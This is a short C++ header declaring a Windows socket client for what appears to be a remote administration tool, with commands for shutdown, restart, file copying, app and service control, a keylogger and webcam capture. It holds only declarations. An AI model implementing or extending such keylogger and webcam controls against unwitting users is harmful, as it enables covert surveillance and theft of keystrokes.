#ifndef CLIENT_SOCKET_H
#define CLIENT_SOCKET_H

#include <winsock2.h>
#include <fstream>
#include <vector>
#include <string>
#include <cstdint>
#include <algorithm>
#include <opencv2/opencv.hpp>

#pragma comment(lib, "ws2_32.lib")

class Client {
public:
    Client(const std::string& serverIP, int port);
    ~Client();
    bool connectToServer();
    bool sendShutdownRequest();

    bool sendRestartRequest();
    bool sendKeyloggerStartRequest();
    bool sendKeyloggerOffRequest();
    bool sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName);
    bool sendListOfAppRequest();
    bool sendOpenAppRequest(const std::string& appName);
    bool sendCloseAppRequest(const std::string& appName);
    bool sendListOfServiceRequest();

    bool sendWebcamRequest();
    bool sendStartWebcamRequest();
    bool sendStopWebcamRequest();
    bool sendCloseWebcamRequest();
    bool sendCloseConnection();
private:
    std::string serverIP;
    int port;
    SOCKET clientSocket;
};

#endif // CLIENT_SOCKET_H
